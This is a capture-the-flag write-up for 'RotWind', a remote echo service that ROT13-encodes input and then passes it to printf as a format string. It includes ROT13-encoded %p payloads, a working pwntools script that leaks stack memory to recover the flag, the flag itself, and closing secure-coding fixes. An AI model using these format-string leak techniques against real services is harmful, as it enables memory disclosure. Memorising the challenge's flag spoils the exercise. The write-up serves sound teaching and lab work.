# RotWind

**Author:** John_x9  
**Difficulty:** Easy+  
**Connect:** `nc 167.86.100.57:9002`

Dorm LAN echo on a Windhoek night. The banner promises "privacy." What you get is ROT13, the same parlor trick as rotating a hostel room number and calling it a lock. The real bug is worse: after the scramble, your text is fed to `printf` as a format string. Fully blind. No binary required.

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9002
```

```text
RotWind echo: type a message
(messages are transformed for "privacy")
```

### 2. Learn the transform

Send `AAAA`. Reply is `NNNN`. Letters shift by 13. Digits and most punctuation stay. That is **ROT13**.

### 3. Discover the format string

A format string bug means the program prints your input with something like `printf(your_text)`. Tokens like `%p` dump memory.

Send `%p.%p.%p` as-is. You will **not** get nice pointer dumps. ROT13 turns `p` into `c`, so `%p` becomes `%c`.

Send the **ROT13 preimage** of the format you want.

| You want after transform | Send this |
|--------------------------|-----------|
| `%p` | `%c` |
| `%s` | `%f` |
| `%x` | `%k` |

Digits and `$` stay the same.

```python
import codecs
payload = codecs.encode('%p.' * 25, 'rot_13')
# letters rotated; % and . stay
```

### 4. Confirm on the remote

```python
from pwn import *
import codecs

io = remote('167.86.100.57', 9002)
io.recvuntil(b'message')
io.sendline(codecs.encode('%p.' * 25, 'rot_13').encode())
print(io.recvall(timeout=2).decode(errors='ignore'))
```

You should see a run of `0x...` values. Format string after ROT13: confirmed.

### 5. Leak the flag from memory

At startup the real flag is loaded into process memory and also sits on the stack. Plan:

1. Leak many stack slots as `%p`.
2. Pack each value as an 8-byte little-endian chunk.
3. Search the blob for `nustCTF{`.

Ignore the honeypot string that may also appear in the leak:

```text
nustCTF{r0tw1nd_h0n3yp0t_n0t_r34l}
```

That one is bait in `.data`. Keep scanning for a different `nustCTF{...}` (the one from `flag.txt`).

### 6. Common mistake

Sending `%6$s` becomes `%6$f` after ROT13. Always write the final format you want, ROT13-encode it on the client, then send.

### 7. Working remote script

```python
#!/usr/bin/env python3
from pwn import *
import codecs
import re

HOST = '167.86.100.57'
PORT = 9002

context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'message')
io.sendline(codecs.encode('%p.' * 25, 'rot_13').encode())

data = io.recvall(timeout=2).decode(errors='ignore')
vals = [int(x, 16) for x in re.findall(r'0x([0-9a-fA-F]+)', data)]
blob = b''.join(p64(v) for v in vals)

honeypot = b'nustCTF{r0tw1nd_h0n3yp0t_n0t_r34l}'
idx = blob.find(b'nustCTF{')
while idx >= 0:
    cand = blob[idx:].split(b'\x00')[0]
    if cand != honeypot:
        print(cand.decode(errors='ignore'))
        break
    idx = blob.find(b'nustCTF{', idx + 1)
```

Same script: [`solves/02-rotwind-solve.py`](solves/02-rotwind-solve.py). If the flag sits deeper, bump `25` to `40`.

---

## Real flag

```text
nustCTF{r0t13_fmt_1s_n0t_pr1v4cy}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
strncpy(scratch, line, sizeof scratch - 1);
scratch[sizeof scratch - 1] = 0;
rot13(scratch);
printf(scratch);   /* user-controlled format string */
```

ROT13 does not sanitize format tokens. `%` survives; letters in format specs are just rotated. The flag is also copied onto the stack (`onstack`), so `%p` leaks recover it.

**Secure coding fixes:**

1. Never pass user input as the format: use `printf("%s", scratch)` or `puts(scratch)`.
2. Do not treat obfuscation (ROT13, Base64, XOR) as a security boundary.
3. Avoid leaving secrets on the stack or in globals longer than needed; clear after use if they must exist.
4. If you must support format-like debug, whitelist a fixed format string chosen by the program, never by the client.
